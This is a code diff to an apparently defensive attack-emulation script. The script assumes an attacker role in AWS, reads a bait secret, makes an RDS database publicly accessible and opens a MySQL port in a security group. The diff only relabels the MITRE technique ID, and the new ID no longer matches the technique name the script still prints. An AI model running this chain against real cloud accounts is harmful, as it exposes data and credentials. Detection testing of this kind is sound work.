@@ -1,7 +1,7 @@
 # FILE: attack.py
 """
 ATOMIC-rds-modify-public-access -- Automated Post-Exploitation Attack Script
-Executes a 4-step, 1-phase attack chain: RDS public access exposure (T1562.007).
+Executes a 4-step, 1-phase attack chain: RDS public access exposure (T1686.001).
 
 Entry point (backend contract):
     run(outputs: dict, region: str = 'us-east-1') -> None
@@ -92,7 +92,7 @@ def _bootstrap_session(outputs: dict, region: str):
 
 def run(outputs: dict, region: str = "us-east-1") -> None:
     """
-    Execute the RDS public-access exposure chain (T1562.007).
+    Execute the RDS public-access exposure chain (T1686.001).
 
     Credential chain:
       - Ambient default boto3.Session calls sts:AssumeRole into attacker-role.
@@ -119,14 +119,14 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
         raise RuntimeError("Missing required output: rds_security_group_id")
 
     _print("=" * 66)
-    _print("ATOMIC: RDS Modify Public Access (T1562.007)")
+    _print("ATOMIC: RDS Modify Public Access (T1686.001)")
     _print("Tactics: Defense Evasion")
     _print(f"Region : {region}")
     _print(f"Target : {rds_instance_id}")
     _print("=" * 66)
 
     # ======================================================================
-    # PHASE 1 -- Impair Cloud Firewall (T1562.007)
+    # PHASE 1 -- Impair Cloud Firewall (T1686.001)
     # ======================================================================
 
     # ------------------------------------------------------------------
@@ -136,7 +136,7 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     # a pipeline/admin principal into a named attacker-role is the initial
     # detection signal.
     # ------------------------------------------------------------------
-    print_step("Step 1/4 [T1562.007] - AssumeRole into attacker-role")
+    print_step("Step 1/4 [T1686.001] - AssumeRole into attacker-role")
 
     default_session = _bootstrap_session(outputs, region)
     sts = default_session.client("sts", region_name=region)
@@ -174,7 +174,7 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     # the threat detection policy is active. Chain MUST continue regardless
     # of whether the call succeeds or returns AccessDenied.
     # ------------------------------------------------------------------
-    print_step("Step 2/4 [T1562.007] - GetSecretValue: enumerating bait prod secret")
+    print_step("Step 2/4 [T1686.001] - GetSecretValue: enumerating bait prod secret")
     sm = attacker_session.client("secretsmanager", region_name=region)
     try:
         sv_resp = sm.get_secret_value(SecretId=prod_secret_arn)
@@ -206,7 +206,7 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     # minutes; GuardDuty may fire a UnauthorizedAccess:RDS/PubliclyAccessible
     # finding depending on detector configuration.
     # ------------------------------------------------------------------
-    print_step("Step 3/4 [T1562.007] - ModifyDBInstance: set publiclyAccessible=True")
+    print_step("Step 3/4 [T1686.001] - ModifyDBInstance: set publiclyAccessible=True")
     rds = attacker_session.client("rds", region_name=region)
     try:
         rds.modify_db_instance(
@@ -231,7 +231,7 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     # staging range. CIDR 10.99.254.0/24 is a non-routable placeholder
     # per emulation safety policy -- never 0.0.0.0/0.
     # ------------------------------------------------------------------
-    print_step("Step 4/4 [T1562.007] - AuthorizeSecurityGroupIngress: open tcp/3306 to 10.99.254.0/24")
+    print_step("Step 4/4 [T1686.001] - AuthorizeSecurityGroupIngress: open tcp/3306 to 10.99.254.0/24")
     ec2 = attacker_session.client("ec2", region_name=region)
     sg_rule_added = False
     try:
@@ -360,7 +360,7 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
     _print("  Step 3  ModifyDBInstance (public=true)   rds.amazonaws.com          [medium]")
     _print("  Step 4  AuthorizeSecurityGroupIngress    ec2.amazonaws.com          [medium]")
     _print("")
-    _print("  Technique : T1562.007 Impair Defenses - Disable or Modify Cloud Firewall")
+    _print("  Technique : T1686.001 Impair Defenses - Disable or Modify Cloud Firewall")
     _print("  Tactic    : Defense Evasion")
     _print(f"  Target    : {rds_instance_id} / {rds_sg_id}")
     _print("")
